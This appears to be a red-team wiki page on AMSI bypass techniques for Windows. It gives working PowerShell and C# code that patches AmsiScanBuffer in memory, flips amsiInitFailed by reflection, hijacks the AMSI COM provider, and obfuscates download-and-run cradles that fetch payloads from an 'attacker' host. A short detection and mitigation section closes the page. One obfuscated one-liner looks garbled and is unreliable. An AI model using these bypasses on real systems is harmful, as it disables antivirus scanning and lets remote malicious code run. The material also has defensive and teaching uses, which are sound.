---
title: AMSI Bypass Techniques
category: techniques
tags: [evasion, amsi, powershell, bypass]
last_updated: 2025-12-27
---

# AMSI Bypass Techniques

## What is AMSI?

The Antimalware Scan Interface (AMSI) is a Windows security feature introduced in Windows 10 that provides a standardized interface for applications to request malware scans from installed antivirus products.

### How AMSI Works

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   PowerShell    │───▶│    amsi.dll     │───▶│   AV/Defender   │
│   Script Host   │    │  AmsiScanBuffer │    │   Detection     │
└─────────────────┘    └─────────────────┘    └─────────────────┘
```

1. Script engine (PowerShell, VBScript, JScript) loads amsi.dll
2. Before execution, script content sent to `AmsiScanBuffer()`
3. AMSI forwards to registered antimalware provider
4. Provider returns AMSI_RESULT (clean/malware/blocked)
5. Script engine proceeds or blocks based on result

### AMSI-Enabled Applications

- PowerShell (v5.0+)
- Windows Script Host (wscript.exe, cscript.exe)
- JavaScript and VBScript
- Office VBA macros
- .NET Framework (v4.8+)
- Windows Management Instrumentation (WMI)

## Bypass Techniques

### 1. Memory Patching (amsi.dll)

Patch the `AmsiScanBuffer` function in memory to always return a clean result.

**PowerShell - Patch AmsiScanBuffer:**

```powershell
# Classic AmsiScanBuffer patch
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

**C# Implementation:**

```csharp
using System;
using System.Runtime.InteropServices;

public class AmsiBypass
{
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Patch()
    {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)6, 0x40, out oldProtect);

        // mov eax, 0x80070057; ret (AMSI_RESULT_CLEAN)
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        Marshal.Copy(patch, 0, addr, 6);
    }
}
```

### 2. Reflection-Based Bypass

Use .NET reflection to modify AMSI internals without direct memory manipulation.

**Modify amsiInitFailed Field:**

```powershell
# Set amsiInitFailed to true
$a = [Ref].Assembly.GetTypes() | Where-Object {$_.Name -like '*iUtils'}
$b = $a.GetFields('NonPublic,Static') | Where-Object {$_.Name -like '*Context'}
[IntPtr]$c = $b.GetValue($null)
[Int32[]]$d = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($d, 0, $c, 1)
```

**Alternative Reflection Method:**

```powershell
# Bypass using reflection to set amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Obfuscated Version:**

```powershell
$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### 3. PowerShell Downgrade Attack

Use PowerShell v2 which predates AMSI.

```powershell
# Check if PowerShell v2 is available
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2

# Launch PowerShell v2 (bypasses AMSI)
powershell.exe -Version 2

# Or from cmd
powershell -version 2 -command "IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
```

**Note:** PowerShell v2 requires .NET Framework 2.0/3.5 which may not be installed.

### 4. Base64 Obfuscation

Encode payloads to avoid signature detection.

```powershell
# Encode command
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)

# Execute encoded command
powershell.exe -EncodedCommand $encoded
```

**Double Encoding:**

```powershell
# First encoding layer
$inner = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($command))

# Second encoding layer
$outer = "IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$inner')))"
$final = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($outer))

powershell -enc $final
```

### 5. String Concatenation and Obfuscation

Break up known malicious strings.

```powershell
# String concatenation
$a = 'Ams'
$b = 'iSc'
$c = 'anB'
$d = 'uffer'
$func = $a + $b + $c + $d

# Variable substitution
$x = 'iex'
& ($x) "(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"

# Tick obfuscation
`I`E`X (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')

# Format string
$f = "{0}{1}" -f 'IE','X'
& ($f) "whoami"
```

### 6. Forcing AMSI Initialization Failure

```powershell
# Force amsiInitFailed
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
```

### 7. COM Object Hijacking

```powershell
# Register fake AMSI provider
New-Item -Path "HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}" -Force
New-Item -Path "HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InprocServer32" -Name "(Default)" -Value "C:\path\to\fake.dll"
```

## One-Liner Bypasses

```powershell
# Matt Graeber's reflection method
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Null byte insertion (may work on older versions)
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

# Shorter obfuscated version
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaijdhajL )."teletioniefef".Invoke( )
```

## Detection and Logging

### Detecting AMSI Bypass Attempts

```powershell
# Check Windows Event Log for AMSI events
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
    Where-Object {$_.Id -eq 4104} |
    Select-Object -First 10

# Look for suspicious patterns
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} |
    Where-Object {$_.Message -match 'AmsiUtils|amsiInitFailed|AmsiScanBuffer'}
```

### Event IDs to Monitor

| Event ID | Description |
|----------|-------------|
| 4104 | Script block logging |
| 4103 | Module logging |
| 4688 | Process creation |

### Indicators of Compromise

- References to `AmsiUtils`, `AmsiScanBuffer`, `amsiInitFailed`
- `VirtualProtect` calls on amsi.dll memory
- PowerShell downgrade (`-Version 2`)
- Heavy Base64 encoding in scripts
- Reflection accessing non-public fields

## Mitigation Recommendations

1. **Enable Script Block Logging**: Captures script content even if AMSI is bypassed
2. **Constrained Language Mode**: Limits PowerShell capabilities
3. **Remove PowerShell v2**: Prevents downgrade attacks
4. **Application Whitelisting**: Restrict script execution
5. **EDR Solutions**: Behavioral detection beyond AMSI

## References

- [Microsoft AMSI Documentation](https://docs.microsoft.com/en-us/windows/win32/amsi/)
- [AMSI Bypass Methods - MITRE](https://attack.mitre.org/techniques/T1562/001/)
